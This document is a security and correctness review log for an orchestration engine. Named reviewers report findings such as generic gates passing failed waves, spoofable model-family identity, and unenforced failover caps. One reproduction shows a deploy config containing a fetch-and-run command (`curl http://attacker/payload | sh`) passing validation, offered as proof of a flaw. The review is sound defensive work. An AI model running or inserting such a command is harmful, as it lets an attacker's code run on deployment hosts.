# Z-Rig Engine / Product-Mode Review Attacks

Dispatch: `2026-06-17-zrig-engine-product-mode-review`
Target corpus: `projects/zrig/Z-RIG-TURBO-V5.5.3-SPECIFICATION.pdf` and `projects/zrig/z-rig-turbo-v5.5.3-engine/z-rig-orchestrator/`
Date: 2026-06-17

This file preserves the attack and verification trail for the review packet. The companion files are `findings.md` and `understanding-map.md`.

## Parent Receipts

Safe commands rerun by the parent:

```bash
PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=src python3 -m zrig validate --config examples/run_config.json --task examples/task_description.json
PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=src python3 -m zrig classify --config examples/run_config.json --task examples/task_description.json
PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=src python3 -m zrig run --config examples/run_config.json --task examples/task_description.json --output-dir /tmp/zrig-review-run-*
PYTHONDONTWRITEBYTECODE=1 PYTHONPATH=src python3 -m pytest --version
```

Observed:

- `validate` passed for the checked-in example config/task.
- `classify` selected `STANDARD`; the example `run_config.json` is `STANDARD`, not `AUTO`.
- `pytest` was unavailable: `/usr/bin/python3: No module named pytest`.
- Dry-run reported `Dry-run Mode: using stub executor`, completed successfully, passed `G10` and `G11`, skipped `W5.5` and `W8.5`, and logged `Residue write failed (non-fatal): PerWaveResidue.__init__() got an unexpected keyword argument 'entries'`.
- Focused gate reproduction returned:
  - `W10 PASS GENERIC [] []` for `{'status': 'failed'}`
  - `W11 PASS GENERIC [] []` for `{'sentinel_status': 'failed', 'regression_detected': True}`
- Focused deploy config reproduction returned `(True, [])` for a config containing `pre_deploy_commands: ["curl http://attacker/payload | sh"]`.
- PDF extraction confirmed:
  - page 4 mode heading: `MICRO · STANDARD · FULL`
  - page 8 run config enum: `["MICRO", "STANDARD", "FULL"]`
  - page 126: orchestrator decides what happens next and must reject invalid transitions
  - page 128: every run must execute inside a dedicated filesystem namespace
  - page 132: concrete entries exist for `G4`, `G5`, `G10`, and `G11`

## Attacker Returns

### Turing / Fidelity And Governance

Initial position:

- Extracted the 139-page PDF and treated it as the product/spec authority.
- PDF page 4 and page 8 only define `MICRO`, `STANDARD`, and `FULL`; `AUTO` is present in code and QuickStart, not in the extracted spec mode enum.
- PDF page 126 places execution-state authority on the orchestrator.
- PDF page 128 requires a dedicated filesystem namespace.
- PDF page 132 defines concrete gate conditions for `G4`, `G5`, `G10`, and `G11`.
- Code registers specific gate evaluators only for `G0`, `G1`, `G2`, `G3`, `G5.5`, `G6`, and `G7`; later standard/product waves fall to generic behavior.
- `W10/W11` are advertised as deploy/sentinel waves, but the direct deploy/sentinel executor only runs if top-level context keys are present, and pipeline context does not provide them.
- Dry-run uses a stub executor and tests assert pipeline completion with stub outputs.

Final position:

- Core risk is an evidence-class mismatch: product-governed pipeline claims are not matched by schema, gate coverage, execution paths, and reachable side-effect modules.
- Keep generic gates as critical.
- Keep `W10/W11` context reachability, dry-run/stub boundary, and live bridge identity trust as major.
- Keep `AUTO` drift but calibrate it to spec-vs-code/docs inconsistency.

### Ashby / Mechanics And Correctness

Initial position:

- Generic gates apply to `W4`, `W5`, `W8`, `W8.5`, `W9`, `W10`, `W11`, and micro gates.
- Pipeline default output can make those waves pass.
- Failover cap is local per concurrent seat because `dispatch.py` creates a fresh mutable counter list for each seat.
- Local repro with cap `2` produced failover counts above the wave cap when several seats fail over concurrently.
- Clean-run logic only inspects `W5` output while the log says `W4+W5`.
- Clean-run skips both `W5.5` and `W8.5`.
- `FULL` `W6/W7` have gates but no specific failure routes; default escalation is used.
- Skipped waves are appended to `waves_completed`, not `waves_skipped`.

Final position:

- Top risks are generic/stub success and runtime bounds not being enforced at the right authority level.
- Keep failover cap, clean-run logic, `W6/W7` routing, and skipped-wave accounting.
- Adopt `W10/W11` context, dry-run boundary, live bridge identity spoofing, and residue persistence if verified.

### van Lamsweerde / Operability

Initial position:

- `validate`, `classify`, and dry-run worked locally.
- Dry-run completed but logged the residue constructor warning.
- `pytest` was not installed.
- QuickStart jumps from optional classify to `--live`; dry-run exists but is not the main operator path.
- `--live` bridge prerequisites are underdocumented: external runtime must read request files, spawn agents, and write manifests.
- Direct deploy/sentinel execution requires top-level context keys not supplied by pipeline context.
- There is no CLI deploy or monitor command.
- `pyproject.toml` declares only project metadata and the script; imports/tests require undeclared packages such as `requests`, `pytest`, and `psycopg2`.
- Deploy config and adapter exist, but examples/operator validation paths are absent.

Final position:

- Treat as a product-mode boundary defect: docs, CLI, gates, bridge, deploy, and monitor blur stub success, live dispatch, and operational assurance.
- Keep QuickStart/live underdocumentation, `W10/W11` config/reachability, missing dependencies, and residue as major.
- Fold deploy examples into the broader deploy/sentinel reachability issue.

### Rittel / Abuse And Gaming

Initial position:

- Explicit failed `W10/W11` payloads pass generic gates.
- `live_executor` copies `model_actual` and `family_actual` from bridge output before falling back to seat metadata.
- Gates count `family_actual`, so self-reported bridge identity can satisfy diversity unless the source of identity is trusted elsewhere.
- Failover wave cap is local per seat.
- Deploy config schema only checks command lists are lists of strings.
- Deploy adapter executes those command strings over SSH.
- Residue constructor mismatch is swallowed as non-fatal.
- Metrics triggers are not wired into pipeline execution.

Final position:

- Keep generic gates merged, with failed `W10/W11` payloads as the clearest abuse proof.
- Keep live bridge self-reported model/family, failover cap, `W10/W11` context, deploy command trust boundary, residue, and metrics.
- Drop `AUTO` from abuse lane.

## Verifier Returns

### Tetlock / Source-Evidence Refutation

Verdicts:

- `F1` survives: source registers only `G0/G1/G2/G3/G5.5/G6/G7`; `W10/W11` map to unregistered gates and fall to generic behavior. PDF page 132 has concrete later-gate conditions.
- `F2` downgraded: dry-run/stub completion is real, but the CLI labels it dry-run. Treat as product-boundary/assurance calibration, not a standalone critical bug.
- `F3` survives: `pipeline.py` passes `entries=` to `PerWaveResidue`, but the dataclass requires `rejected_alternatives`, `dead_ends`, `minority_dissent`, `lessons`, and `timestamp`.
- `F4` required executable verification; source trace is plausible.
- `F5` survives: live bridge contract is in code, not in QuickStart.
- `F6` survives: pipeline context does not supply top-level deploy/sentinel config required by live executor, and CLI exposes only `run`, `validate`, and `classify`.
- `F7` survives: deploy schema validates only strings; adapter executes commands via SSH.
- `F8` survives: dependencies are undeclared; tests require `pytest`.
- `F9` survives: failover cap authority is per seat.
- `F10` survives: clean-run only inspects W5 while logging W4+W5 and skips `W5.5/W8.5`.
- `F11` survives: `W6/W7` use default routing.
- `F12` survives: skipped waves are counted in completed list.
- `F13` survives only as downgraded spec-vs-code/docs inconsistency; checked-in example config is not `AUTO`.
- `F14` survives: metrics store exists but is not wired into the pipeline.

### Schon / Executable-Reproduction Refutation

Verdicts:

- `F1` survives: reproduced `W10 PASS GENERIC [] []` and `W11 PASS GENERIC [] []`.
- `F2` survives: dry-run completed a standard pipeline with stub executor; output reported `G10/G11` pass and final completion.
- `F3` survives: dry-run emitted the residue constructor warning; focused constructor repro produced the same `TypeError`.
- `F4` survives: focused parser reproduction showed three outputs with one actual model and spoofed families can be parsed as distinct families and pass `G2`; normal `live_executor` import is blocked by missing `psycopg2`.
- `F5` survives: QuickStart does not document the manifest/envelope contract.
- `F6` survives: `_build_wave_context` lacks top-level `deploy_config` and `sentinel_config`; CLI only exposes `run`, `validate`, and `classify`.
- `F7` survives: arbitrary deploy command string validates; adapter execution path is SSH. Deployment was not run.
- `F8` survives: `pytest` missing, `requests` undeclared, and `psycopg2` missing.
- `F9` survives: focused async repro exceeded wave failover cap across concurrent seats.
- `F10` survives: clean-run only inspects W5 and skips `W5.5/W8.5`.
- `F11` survives: no `W6/W7` routes.
- `F12` survives: skipped waves are appended as completed.
- `F13` downgraded: keep only PDF-vs-QuickStart/code inconsistency.
- `F14` survives: metrics methods exist but no pipeline use was found.

## Coverage Notes

Declared target classes covered:

- PDF/spec: Turing, Tetlock, parent PDF extraction.
- QuickStart/operator docs: Turing, van Lamsweerde, Tetlock, Schon.
- Config/schema: Turing, Rittel, parent repro.
- Mode classifier: parent `classify`, Turing, verifiers.
- Manifest/wave sequence: Ashby, Schon, parent dry-run.
- Pipeline/failure routing: Ashby, Tetlock, Schon.
- Gates: all attackers, both verifiers, parent focused repro.
- Dispatch/family diversity/failover: Ashby, Rittel, Schon.
- Live OpenClaw bridge: Turing, van Lamsweerde, Rittel, both verifiers.
- Deployment/sentinel: van Lamsweerde, Rittel, both verifiers.
- Residue/metrics: van Lamsweerde, Rittel, both verifiers, parent dry-run.
- Examples/tests: van Lamsweerde, parent CLI checks.
